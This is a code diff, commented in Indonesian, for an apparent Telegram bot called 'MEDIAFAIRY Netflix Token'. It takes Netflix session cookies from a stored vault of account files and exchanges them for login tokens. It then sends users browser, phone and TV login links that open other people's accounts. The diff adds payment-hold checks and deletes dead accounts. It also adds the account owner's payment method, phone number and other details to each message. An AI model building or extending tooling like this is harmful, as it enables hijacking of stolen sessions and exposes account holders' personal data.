@@ -1,14 +1,16 @@
 import type { Bot } from './bot';
-import type { CountryFilter, VaultEntry } from './types';
+import type { CountryFilter, NfMetadata, VaultEntry } from './types';
 import type { VaultResult } from './vaultstore';
 import { adminContact, escapeHtml } from './telegram';
 import { getStats, isUnlimited, remainingQuota } from './stats';
 import { extractCookieDict, extractMetadata, fetchNfToken, isDeadFailure, maskEmail } from './netflix';
-import { resolveCountry } from './countries';
+import { resolveCountry, flagEmoji } from './countries';
+import { fetchAccountSnapshot } from './safety';
+import type { AccountSnapshot } from './safety';
 import { startLoading } from './loading';
 import type { Loading } from './loading';
 
-const MAX_RANDOM_ATTEMPTS = 5;
+const MAX_RANDOM_ATTEMPTS = 8;
 
 /** Ambil kode negara dari entry vault (fallback ke resolusi region). */
 export function entryCountry(v: VaultEntry): string | null {
@@ -20,6 +22,60 @@ export function entryCountry(v: VaultEntry): string | null {
 export function filterVaultByCountry(vault: VaultEntry[], country: CountryFilter | null): VaultEntry[] {
   if (!country || country === 'global') return vault;
   return vault.filter((v) => entryCountry(v) === country);
+}
+
+/**
+ * Susun pesan token yang diterima user.
+ *
+ * Prioritas data: halaman akun Netflix (paling akurat & terbaru) -> metadata
+ * berkas yang diunggah. Baris yang datanya memang tidak ada tidak dicetak,
+ * kecuali Nomor HP/Pembayaran yang tetap ditulis "Tidak ada" supaya user tahu.
+ */
+export function buildTokenMessage(opts: {
+  meta: NfMetadata;
+  snap: AccountSnapshot | null;
+  /** Kode ISO2 dari entryCountry(), dipakai bila snapshot tidak memberi negara. */
+  fallbackCountry: string | null;
+  loginBrowser: string;
+  loginMobile: string;
+  loginTv: string;
+  expDate: string;
+}): string {
+  const { meta, snap, fallbackCountry, loginBrowser, loginMobile, loginTv, expDate } = opts;
+
+  const email = maskEmail(snap?.email || meta.email);
+  const plan = snap?.plan || meta.plan;
+  const memberSince = snap?.memberSince || meta.memberSince;
+  const nextBilling = snap?.nextBilling || meta.nextBilling;
+  const country = snap?.country || fallbackCountry;
+
+  let out = `✅ <b>Token Netflix Berhasil Dibuat</b>\n\n`;
+  out += `📧 <b>Email:</b> ${escapeHtml(email)}\n`;
+  if (snap && snap.emailVerified !== null) {
+    out += `📨 <b>Email Terverifikasi:</b> ${snap.emailVerified ? '✅ Ya' : '⚠️ Belum'}\n`;
+  }
+  out += country
+    ? `🌍 <b>Negara:</b> ${flagEmoji(country)} ${escapeHtml(country)}\n`
+    : `🌍 <b>Region:</b> ${escapeHtml(meta.region)}\n`;
+  out += `💎 <b>Plan:</b> ${escapeHtml(plan)}\n`;
+  out += `🗓 <b>Member Since:</b> ${escapeHtml(memberSince)}\n`;
+  if (nextBilling) out += `⏳ <b>Next Billing:</b> ${escapeHtml(nextBilling)}\n`;
+  if (snap) {
+    out += `💳 <b>Pembayaran:</b> ${escapeHtml(snap.paymentMethod || 'Tidak ada')}\n`;
+    if (snap.profileCount !== null) out += `👥 <b>Profil:</b> ${snap.profileCount}\n`;
+    out += `📱 <b>Nomor HP:</b> ${escapeHtml(snap.phone || 'Tidak ada')}\n`;
+    out += `🟢 <b>Status Akun:</b> Aktif\n\n`;
+  } else {
+    out += `🟡 <b>Status Akun:</b> Tidak diverifikasi (gangguan jaringan)\n\n`;
+  }
+
+  out +=
+    `💻 <b>Login Browser</b>\n<a href="${loginBrowser}">➡️ Klik disini</a>\n\n` +
+    `📱 <b>Login Hp</b>\n<a href="${loginMobile}">➡️ Klik disini</a>\n\n` +
+    `📺 <b>Login TV</b>\n<a href="${loginTv}">➡️ Klik disini</a>\n\n` +
+    `⏳ <b>Expires:</b> <code>${expDate}</code>\n\n` +
+    `<b>MEDIAFAIRY Netflix Token</b>`;
+  return out;
 }
 
 /**
@@ -99,6 +155,9 @@ export async function processGeneration(
     let success = false;
     let inconclusive = false;
     let accountsRemoved = 0;
+    let holdRemoved = 0;
+    let snap: AccountSnapshot | null = null;
+    let chosen: VaultEntry | null = null;
     // Akun mati ditandai `dead` (bukan langsung dihapus) supaya masih bisa
     // dilaporkan di /admin, lalu dipangkas oleh pembersihan berkala.
     const dead: VaultResult[] = [];
@@ -112,13 +171,9 @@ export async function processGeneration(
         continue;
       }
 
+      let tokenData;
       try {
-        const tokenData = await fetchNfToken(cookieDict.NetflixId);
-        nfToken = tokenData.token;
-        expires = tokenData.expires;
-        meta = extractMetadata(candidate.rawText);
-        success = true;
-        break;
+        tokenData = await fetchNfToken(cookieDict.NetflixId);
       } catch (e) {
         // Rate-limit / gangguan jaringan BUKAN bukti cookie mati. Jangan buang
         // akun dan jangan habiskan cooldown user.
@@ -128,7 +183,30 @@ export async function processGeneration(
         }
         dead.push({ id: candidate.id, status: 'dead', reason: 'cookie_mati' });
         accountsRemoved++;
+        continue;
       }
+
+      // Cookie hidup. Periksa penahanan pembayaran: akun seperti itu tetap bisa
+      // membuat token, tetapi user akan mentok di layar tagihan Netflix, jadi
+      // lebih baik dibuang sekarang dan langsung coba kandidat berikutnya.
+      if (bot.cfg.CHECK_PAYMENT_HOLD) {
+        const accountSnap = await fetchAccountSnapshot(cookieDict.NetflixId);
+        if (accountSnap && accountSnap.onHold) {
+          await bot.vault.deleteById(candidate.id);
+          holdRemoved++;
+          accountsRemoved++;
+          continue;
+        }
+        // `null` (gangguan jaringan) bukan bukti apa pun: akun tetap dipakai.
+        snap = accountSnap;
+      }
+
+      nfToken = tokenData.token;
+      expires = tokenData.expires;
+      meta = extractMetadata(candidate.rawText);
+      chosen = candidate;
+      success = true;
+      break;
     }
 
     if (dead.length > 0) {
@@ -151,7 +229,10 @@ export async function processGeneration(
       }
       await bot.send(
         chatId,
-        `❌ <b>Semua Sampel Acak Mati!</b>\nSistem otomatis menguji dan <b>menghapus ${accountsRemoved} akun mati</b> dari sistem. Silakan coba lagi.\n\n` +
+        `❌ <b>Semua Sampel Acak Mati!</b>\n` +
+          `Sistem otomatis menguji ${candidates.length} akun acak dan <b>menghapus ${accountsRemoved} akun</b>` +
+          (holdRemoved > 0 ? ` (${holdRemoved} di antaranya ditahan Netflix karena masalah pembayaran)` : '') +
+          ` dari sistem. Silakan coba lagi.\n\n` +
           `<i>Tidak ada cooldown yang terpakai.</i>`
       );
       return;
@@ -172,19 +253,16 @@ export async function processGeneration(
     const loginTv = 'https://netflix.com/tv2?nftoken=' + nfToken;
     const expDate = new Date(expires).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-    const maskedEmail = maskEmail(meta.email);
-    const premiumOutput =
-      `✅ <b>Token Netflix Berhasil Dibuat</b>\n\n` +
-      `📧 <b>Email:</b> ${escapeHtml(maskedEmail)}\n` +
-      `🌍 <b>Region:</b> ${escapeHtml(meta.region)}\n` +
-      `💎 <b>Plan:</b> ${escapeHtml(meta.plan)}\n` +
-      `🗓 <b>Member Since:</b> ${escapeHtml(meta.memberSince)}\n` +
-      `⏳ <b>Next Billing:</b> ${escapeHtml(meta.nextBilling)}\n\n` +
-      `💻 <b>Login Browser</b>\n<a href="${loginBrowser}">➡️ Klik disini</a>\n\n` +
-      `📱 <b>Login Hp</b>\n<a href="${loginMobile}">➡️ Klik disini</a>\n\n` +
-      `📺 <b>Login TV</b>\n<a href="${loginTv}">➡️ Klik disini</a>\n\n` +
-      `⏳ <b>Expires:</b> <code>${expDate}</code>\n\n` +
-      `<b>MEDIAFAIRY Netflix Token</b>`;
+    const maskedEmail = maskEmail(snap?.email || meta.email);
+    const premiumOutput = buildTokenMessage({
+      meta,
+      snap,
+      fallbackCountry: chosen ? entryCountry(chosen) : null,
+      loginBrowser,
+      loginMobile,
+      loginTv,
+      expDate,
+    });
 
     // Stiker dihapus lebih dulu, baru token dikirim.
     if (loading) await loading.finish();
